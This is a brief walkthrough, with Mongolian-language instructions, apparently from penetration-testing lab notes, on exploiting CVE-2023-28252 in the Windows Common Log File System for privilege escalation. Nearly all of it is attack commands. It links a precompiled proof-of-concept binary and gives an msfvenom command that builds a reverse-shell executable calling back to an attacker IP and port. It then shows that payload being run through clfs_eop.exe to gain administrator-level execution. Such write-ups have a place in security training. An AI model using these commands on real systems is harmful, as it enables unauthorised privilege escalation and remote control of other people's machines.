# Common Log File System - CVE-2023-28252 Privilege Escalation

Reference: https://github.com/bkstephen/Compiled-PoC-Binary-For-CVE-2023-28252

[image]

**Create malicious reverse.exe**

Repo-г GitHub-аас татаж авна. Дараа нь reverse.exe үүсгээд зорилтот сервер рүү зөөнө.

```bash
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.28 lport=3333 -f exe -o reverse.exe
```

## Execute the clfs_eop.exe

Энэ payload нь зөвхөн админ эрхээр ажиллах нэг файлыг дуудахыг зөвшөөрнө:

```powershell
PS C:\users\sam.emerson\documents> .\clfs_eop.exe C:\users\sam.emerson\documents\reverse.exe
```

[image]
